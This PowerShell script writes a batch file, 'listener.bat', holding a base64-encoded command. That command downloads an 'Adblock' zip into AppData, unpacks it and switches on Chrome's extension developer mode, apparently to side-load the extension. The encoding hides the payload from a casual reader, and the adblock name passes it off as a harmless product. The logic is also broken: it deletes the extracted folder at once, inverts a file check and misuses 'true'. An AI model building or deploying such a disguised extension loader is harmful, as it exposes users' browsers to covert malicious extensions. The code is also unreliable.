$block = {
    Write-Host "Starting Download of Adblock.zip";
    $ProgressPreference = 'SilentlyContinue'
    $name = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $outz = "{0}\{1}.zip" -f $Env:TMP,$name;
    Invoke-WebRequest -Uri "" -OutFile $outz;
    $outf = "{0}\Adblock-Chrome" -f $env:APPDATA;
    New-Item $outf -ItemType dir;
    Write-Host "Expanding Archive";
    Expand-Archive -Path $outz -DestinationPath $outf;
    Remove-Item $outf -Force;
    Write-Host "Enabling Chrome Extension Developer Option";
    Write-Host "Finding Master Preferances File";
    $masterf = ("{0}\AppData\Local\Google\Chrome\Application\master_preferences" -f $env:UserProfile)
    if (Test-Path $masterf) {
        Write-Error "Couldn't Find Master Preferences File In User Profile, Exiting"
        if (Test-Path "C:\Program Files(x86)\Google\Chrome\Application") {
            Write-Host "Master Preferences Was Found In Programs Files";
            Write-Host "This Script Won't Work With it installed there";
            Write-Host "Copying Directory To Clipboard";
            Set-Clipboard $outf;
        }
        Read-Host -Prompt "Press Enter To Exit"
        exit(1)
    }
    
    $mf = ConvertFrom-Json -InputObject (Get-Content $masterf);
    $mf["extensions"]["ui"]["developer_mode"] = true;
    Set-Content $masterf -Value (ConvertTo-Json -InputObject $mf -Depth 20)
    Write-Host "Master Preferences File Was Updated
    Copying Path to clipboard";
    Set-Clipboard $outf;        
    Read-Host -Prompt "Press Enter To Exit";
    exit(0)
}.ToString();

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($block))
$startcmd = ('@start powershell -enc "{0}" '-f$encoded);
New-Item -Path ".\listener.bat" -ItemType file -Value $startcmd

#powershell -EncodedCommand 
